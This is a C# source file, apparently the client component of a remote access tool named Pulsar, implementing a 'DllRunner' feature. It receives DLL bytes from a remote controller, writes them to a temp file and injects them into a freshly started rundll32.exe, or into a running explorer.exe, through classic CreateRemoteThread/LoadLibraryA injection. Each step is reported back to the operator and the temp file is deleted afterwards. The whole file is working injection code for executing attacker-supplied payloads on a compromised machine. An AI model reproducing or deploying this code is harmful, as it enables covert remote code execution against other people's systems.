using System;
using System.Runtime.InteropServices;
using System.Threading;
using Pulsar.Common.Messages;
using Pulsar.Common.Messages.FunStuff;
using Pulsar.Common.Networking;
using System.Diagnostics;
using System.IO;
using System.Text;

namespace Pulsar.Client.FunStuff
{
    internal class DllRunner
    {
        [Flags]
        public enum ProcessAccessFlags : uint
        {
            All = 0x001F0FFF,
            Terminate = 0x00000001,
            CreateThread = 0x00000002,
            VirtualMemoryOperation = 0x00000008,
            VirtualMemoryRead = 0x00000010,
            VirtualMemoryWrite = 0x00000020,
            DuplicateHandle = 0x00000040,
            CreateProcess = 0x000000080,
            SetQuota = 0x00000100,
            SetInformation = 0x00000200,
            QueryInformation = 0x00000400,
            QueryLimitedInformation = 0x00001000,
            Synchronize = 0x00100000
        }

        [Flags]
        public enum AllocationType
        {
            Commit = 0x1000,
            Reserve = 0x2000,
            Decommit = 0x4000,
            Release = 0x8000,
            Reset = 0x80000,
            Physical = 0x400000,
            TopDown = 0x100000,
            WriteWatch = 0x200000,
            LargePages = 0x20000000
        }

        [Flags]
        public enum MemoryProtection
        {
            Execute = 0x10,
            ExecuteRead = 0x20,
            ExecuteReadWrite = 0x40,
            ExecuteWriteCopy = 0x80,
            NoAccess = 0x01,
            ReadOnly = 0x02,
            ReadWrite = 0x04,
            WriteCopy = 0x08,
            GuardModifierflag = 0x100,
            NoCacheModifierflag = 0x200,
            WriteCombineModifierflag = 0x400
        }

        public void Handle(DoSendBinFile message, ISender client)
        {
            if (message?.Data == null || message.Data.Length == 0)
            {
                client.Send(new SetStatus { Message = "Error: Empty DLL payload" });
                return;
            }

            new Thread(() =>
            {
                try
                {
                    ExecuteDll(message.Data, client);
                }
                catch (Exception ex)
                {
                    client.Send(new SetStatus { Message = $"Error: {ex.Message}" });
                }
            })
            {
                IsBackground = true
            }.Start();
        }

        private void ExecuteDll(byte[] dllData, ISender client)
        {
            client.Send(new SetStatus { Message = $"Loading DLL ({dllData.Length} bytes)..." });

            // Use a temporary file but delete it immediately after injection
            string tempDllPath = null;
            IntPtr procHandle = IntPtr.Zero;
            Process targetProcess = null;

            try
            {
                // Step 1: Create temporary DLL file
                tempDllPath = Path.Combine(Path.GetTempPath(), $"tmp_{Guid.NewGuid():N}.dll");
                File.WriteAllBytes(tempDllPath, dllData);
                client.Send(new SetStatus { Message = $"[+] Temporary file created: {Path.GetFileName(tempDllPath)}" });

                // Step 2: Start rundll32 process
                targetProcess = StartRundll32Process(client);
                if (targetProcess == null || targetProcess.HasExited)
                {
                    throw new Exception("Failed to start or access rundll32 process");
                }

                int procId = targetProcess.Id;
                client.Send(new SetStatus { Message = $"[+] Target process PID: {procId}" });

                // Step 3: Open handle to target process
                procHandle = OpenProcess(ProcessAccessFlags.All, false, procId);
                if (procHandle == IntPtr.Zero)
                {
                    throw new Exception($"OpenProcess failed: 0x{Marshal.GetLastWin32Error():X8}");
                }
                client.Send(new SetStatus { Message = $"[+] Process handle obtained" });

                // Step 4: Allocate memory for DLL path in target process
                byte[] pathBytes = Encoding.ASCII.GetBytes(tempDllPath);
                IntPtr pathAddr = VirtualAllocEx(
                    procHandle,
                    IntPtr.Zero,
                    (IntPtr)(pathBytes.Length + 1), // +1 for null terminator
                    AllocationType.Reserve | AllocationType.Commit,
                    MemoryProtection.ReadWrite);

                if (pathAddr == IntPtr.Zero)
                {
                    throw new Exception($"VirtualAllocEx failed: 0x{Marshal.GetLastWin32Error():X8}");
                }
                client.Send(new SetStatus { Message = $"[+] Memory allocated for DLL path" });

                // Step 5: Write DLL path to target process
                bool writeSuccess = WriteProcessMemory(
                    procHandle,
                    pathAddr,
                    pathBytes,
                    pathBytes.Length,
                    out IntPtr bytesWritten);

                if (!writeSuccess)
                {
                    throw new Exception($"WriteProcessMemory failed: 0x{Marshal.GetLastWin32Error():X8}");
                }
                client.Send(new SetStatus { Message = $"[+] DLL path written to target process" });

                // Step 6: Get LoadLibraryA address
                IntPtr kernel32Handle = GetModuleHandle("kernel32.dll");
                IntPtr loadLibraryAddr = GetProcAddress(kernel32Handle, "LoadLibraryA");

                if (loadLibraryAddr == IntPtr.Zero)
                {
                    throw new Exception($"GetProcAddress failed: 0x{Marshal.GetLastWin32Error():X8}");
                }
                client.Send(new SetStatus { Message = $"[+] LoadLibraryA address obtained" });

                // Step 7: Create remote thread to load the DLL
                IntPtr remoteThread = CreateRemoteThread(
                    procHandle,
                    IntPtr.Zero,
                    0,
                    loadLibraryAddr,
                    pathAddr,
                    0,
                    IntPtr.Zero);

                if (remoteThread == IntPtr.Zero)
                {
                    throw new Exception($"CreateRemoteThread failed: 0x{Marshal.GetLastWin32Error():X8}");
                }
                client.Send(new SetStatus { Message = $"[+] Remote thread created" });

                // Step 8: Wait for thread to complete
                uint waitResult = WaitForSingleObject(remoteThread, 10000);
                if (waitResult == 0x00000000) // WAIT_OBJECT_0
                {
                    client.Send(new SetStatus { Message = $"[+] DLL loaded successfully" });

                    // Check exit code
                    GetExitCodeThread(remoteThread, out uint exitCode);
                    if (exitCode != 0)
                    {
                        client.Send(new SetStatus { Message = $"[+] DLL loaded at base address: 0x{exitCode:X8}" });
                    }
                }
                else if (waitResult == 0x00000102) // WAIT_TIMEOUT
                {
                    client.Send(new SetStatus { Message = "[!] Thread timeout, but DLL may have loaded" });
                }
                else
                {
                    client.Send(new SetStatus { Message = $"[!] Wait failed with code: 0x{waitResult:X8}" });
                }

                // Give time for message box to appear
                Thread.Sleep(2000);

                client.Send(new SetStatus { Message = $"[+] Injection completed for PID: {procId}" });
            }
            catch (Exception ex)
            {
                client.Send(new SetStatus { Message = $"Injection failed: {ex.Message}" });
            }
            finally
            {
                // Step 9: Clean up resources
                try
                {
                    // Delete temporary file immediately
                    if (tempDllPath != null && File.Exists(tempDllPath))
                    {
                        File.Delete(tempDllPath);
                        client.Send(new SetStatus { Message = $"[+] Temporary file cleaned up" });
                    }

                    // Close handles
                    if (procHandle != IntPtr.Zero)
                    {
                        CloseHandle(procHandle);
                    }

                    // Don't kill the target process - let it run so we can see the message box
                    if (targetProcess != null && !targetProcess.HasExited)
                    {
                        client.Send(new SetStatus { Message = $"[+] Target process {targetProcess.ProcessName} is still running" });
                    }
                }
                catch (Exception cleanupEx)
                {
                    //client.Send(new SetStatus { Message = $"[!] Cleanup warning: {cleanupEx.Message}" });
                }
            }
        }

        private Process StartRundll32Process(ISender client)
        {
            try
            {
                // Start rundll32 with a long sleep command to keep it alive
                Process process = new Process();
                process.StartInfo.FileName = "rundll32.exe";
                process.StartInfo.Arguments = "kernel32.dll,SleepEx 30000"; // Sleep for 30 seconds
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.CreateNoWindow = false; // Allow window creation
                process.StartInfo.WindowStyle = ProcessWindowStyle.Normal;

                process.Start();

                // Wait for process to initialize
                Thread.Sleep(2000);

                // Refresh to get current process info
                try { process.Refresh(); } catch { }

                client.Send(new SetStatus { Message = $"[+] Started rundll32.exe (PID: {process.Id})" });
                return process;
            }
            catch (Exception ex)
            {
                client.Send(new SetStatus { Message = $"Failed to start rundll32: {ex.Message}" });

                // Fallback to explorer if rundll32 fails
                try
                {
                    Process[] processes = Process.GetProcessesByName("explorer");
                    if (processes.Length > 0)
                    {
                        client.Send(new SetStatus { Message = $"[+] Using existing explorer.exe (PID: {processes[0].Id})" });
                        return processes[0];
                    }
                }
                catch { }

                throw new Exception("No suitable target process available");
            }
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr OpenProcess(
            ProcessAccessFlags processAccess,
            bool bInheritHandle,
            int processId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        private static extern IntPtr VirtualAllocEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            IntPtr dwSize,
            AllocationType flAllocationType,
            MemoryProtection flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool WriteProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            byte[] lpBuffer,
            int nSize,
            out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr CreateRemoteThread(
            IntPtr hProcess,
            IntPtr lpThreadAttributes,
            uint dwStackSize,
            IntPtr lpStartAddress,
            IntPtr lpParameter,
            uint dwCreationFlags,
            IntPtr lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool VirtualFreeEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            int dwSize,
            AllocationType dwFreeType);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool CloseHandle(IntPtr hObject);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool GetExitCodeThread(IntPtr hThread, out uint lpExitCode);

        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);
    }
}